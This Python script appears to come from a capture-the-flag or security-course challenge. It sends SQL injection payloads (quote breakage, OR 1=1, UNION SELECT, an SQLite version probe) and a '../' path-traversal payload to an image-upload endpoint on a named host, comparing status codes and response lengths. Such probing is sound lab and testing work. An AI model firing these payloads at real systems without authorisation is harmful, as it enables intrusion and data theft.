# uploads_sqli.py — /uploads/<filename> serves an image. If the server does
# SELECT ... WHERE filename='<x>' (or reads file by name), the filename may be injectable or
# traversable. Test SQL breakage (500) and behavior differences. Use a REAL known filename as
# baseline. Category is SQLi and this endpoint was never injection-tested.
import requests, urllib.parse
BASE = "https://chl-f4e46c02-efed-4276-8edf-ffade8aa3cf6-mis-viajes-v2.softwareseguro.com.ar"
UID  = "ea42cd39-001b-4fb5-a509-449322674687"

# get one of our real filenames as a valid baseline
data = requests.get(f"{BASE}/images/{UID}").json()
real = data[0]["filename"]
print("baseline filename:", real)

def get(fn, enc=True):
    seg = urllib.parse.quote(fn, safe="") if enc else fn
    r = requests.get(f"{BASE}/uploads/{seg}")
    return r.status_code, len(r.content), r.headers.get("Content-Type","")

tests = [
    ("real (baseline)", real),
    ("real + quote",    real + "'"),
    ("real no ext",     real.replace(".jpg","")),
    ("quote only",      "'"),
    ("or 1=1",          "x' OR '1'='1"),
    ("union null",      "x' UNION SELECT NULL-- "),
    ("sqlite err",      "x'||(SELECT sqlite_version())||'.jpg"),
    ("traversal",       "../"+real),
    ("wildcard",        "%"),
]
for name, fn in tests:
    sc, ln, ct = get(fn)
    print(f"{name:18} -> {sc} len={ln} {ct}")
